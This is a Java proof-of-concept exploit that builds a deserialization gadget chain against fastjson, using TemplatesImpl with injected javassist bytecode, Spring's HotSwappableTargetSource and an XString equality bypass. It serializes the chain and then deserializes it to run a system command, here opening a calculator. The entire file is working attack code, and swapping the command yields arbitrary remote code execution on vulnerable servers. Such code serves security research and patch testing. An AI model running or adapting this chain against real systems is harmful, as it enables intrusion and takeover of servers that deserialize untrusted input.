package com.ocean;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.target.HotSwappableTargetSource;
import java.io.*;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
public class fastjsonyuanshengBypass_xstring {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] codes = cc.toBytecode();

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {codes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

//        ArrayList<Object> arrayList = new ArrayList<>();
//        arrayList.add(templatesimpl);
//        JSONArray jsonArray = new JSONArray();
//        jsonArray.add(templatesimpl);


        JSONObject jo = new JSONObject();
        jo.put("1",templatesimpl);
        jo.put("3","3");

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jo);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new Object());
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("2","2");
        hashMap.put(h1,"h1");
        hashMap.put(h2,h2);
        setValue(h2,"target",new XString("xx"));
        HashMap<Object,Object> hhhhashMap = new HashMap<>();
        hhhhashMap.put("1","1");
        hhhhashMap.put(templatesimpl,hashMap);



        String base64 = serial(hhhhashMap);
        System.out.println(base64);
        deserial(Base64.getDecoder().decode(base64));
    }

    public static String serial(Object o) throws IOException, IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void deserial(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
